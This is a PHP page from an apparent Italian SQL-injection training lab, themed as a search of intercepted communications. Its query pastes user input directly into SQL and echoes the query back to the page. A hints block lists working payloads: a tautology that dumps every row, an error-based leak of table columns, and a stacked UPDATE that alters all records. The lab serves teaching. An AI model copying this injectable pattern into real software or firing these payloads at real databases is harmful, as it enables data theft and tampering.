<?php
session_start();
if (!isset($_SESSION['user_data'])) {
    header('Location: login.php');
    exit;
}
require_once 'db_config.php';

$results = [];
$target_code = '';

if (isset($_GET['target'])) {
    $target_code = $_GET['target'];
    
    $query = "SELECT ci.*, 
              b1.codice_bersaglio as mittente, 
              b1.nome_reale as mittente_nome,
              b2.codice_bersaglio as destinatario,
              b2.nome_reale as destinatario_nome,
              o.codice_operazione,
              o.nome_operazione
              FROM comunicazioni_intercettate ci
              LEFT JOIN bersagli b1 ON ci.bersaglio_mittente_id = b1.id
              LEFT JOIN bersagli b2 ON ci.bersaglio_destinatario_id = b2.id
              LEFT JOIN operazioni_intercettazione o ON ci.operazione_id = o.id
              WHERE b1.codice_bersaglio = '$target_code' OR b2.codice_bersaglio = '$target_code'";
    
    echo "<!-- DEBUG Query: $query -->";
    
    $results = execute_query($query);
}
$db_error = null;
if (!empty($results) && isset($results[0]['__error'])) {
    $db_error = $results[0]['__error'];
    $results = [];
}
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comunicazioni Intercettate</title>
    <link rel="stylesheet" href="/css/common.css">
    <link rel="stylesheet" href="/css/communications.css">
</head>
<body>
    <div class="container">
        <h1>COMUNICAZIONI INTERCETTATE</h1>
        
        <form method="GET" class="search-form">
            <input type="text" name="target" 
                   placeholder="Inserisci codice bersaglio..." 
                   value="<?php echo htmlspecialchars($target_code); ?>">
            <input type="submit" value="CERCA">
        </form>
        
        <?php if ($results && count($results) > 0): ?>
            <div class="results-count">
                <strong>Risultati trovati: <?php echo count($results); ?> comunicazioni</strong>
            </div>
            
            <?php foreach ($results as $comm): ?>
                <div class="success-box" style="margin-bottom: 20px;">
                    <div class="card-header">
                        <div class="card-title">
                            COM: <?php echo htmlspecialchars($comm['id'] ?? ''); ?>
                        </div>
                    </div>
                    
                    <div class="user-info">
                        <div class="info-item">
                            <div class="info-label">Operazione</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($comm['codice_operazione'] ?? 'N/A'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Mittente</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($comm['mittente'] ?? 'N/A'); ?><br>
                                <small style="color: #666;">
                                    <?php echo htmlspecialchars($comm['mittente_nome'] ?? 'N/A'); ?>
                                </small>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Destinatario</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($comm['destinatario'] ?? 'N/A'); ?><br>
                                <small style="color: #666;">
                                    <?php echo htmlspecialchars($comm['destinatario_nome'] ?? 'N/A'); ?>
                                </small>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Timestamp</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($comm['timestamp_intercettazione'] ?? ''); ?>
                            </div>
                        </div>
                        
                    </div>
                    
                    <?php if (!empty($comm['contenuto_decriptato'])): ?>
                        <div class="message-section">
                            <strong>CONTENUTO DECRIPTATO:</strong><br>
                            <span class="encrypted-field">
                                <?php echo nl2br(htmlspecialchars($comm['contenuto_decriptato'])); ?>
                            </span>
                        </div>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
            
        <?php elseif (isset($_GET['target'])): ?>
            <?php if ($db_error): ?>
                <div style="text-align: center; color: #f00; padding: 20px; border: 1px solid #f00; border-radius: 5px; word-wrap: break-word; word-break: break-word; overflow-wrap: break-word; max-width: 100%;">
                    Errore database: "<?php echo htmlspecialchars($db_error); ?>"
                </div>
            <?php endif; ?>
            
            <div style="text-align: center; color: #f00; padding: 20px; border: 1px solid #f00; border-radius: 5px; word-wrap: break-word; word-break: break-word; overflow-wrap: break-word; max-width: 100%;">
                Nessuna comunicazione trovata per: "<?php echo htmlspecialchars($target_code); ?>"
                <br><br>
                <?php echo htmlspecialchars($query); ?>
            </div>
        <?php endif; ?>
        
        <div class="hints">
            <h3>ISTRUZIONI PER ATTACCO SQL INJECTION</h3>
            
            <strong>1. Mostra la Query:</strong>
            <code>Qualsiasi</code>

            <strong>2. Mostra tutte le comunicazioni (Tautologia + Commento):</strong>
            <code>' OR '1'='1' --</code>
            
            <strong>3. Lancia Errore per scoprire la struttura tabella (Information Schema):</strong>
            <code>' AND 1=CAST((SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='comunicazioni_intercettate') AS INT) --</code>
            
            <strong>4. Modifica timestamp comunicazione (piggybacked - INTEGRITY):</strong>
            <code>' OR '1'='1'; UPDATE comunicazioni_intercettate SET timestamp_intercettazione=to_timestamp(0) WHERE '1'='1' --</code>
            
        </div>
        
        <div class="bottom-buttons">
            <a href="login.php" class="btn1 left">&lt;- Indietro </a>
        </div>
    </div>
</body>
</html>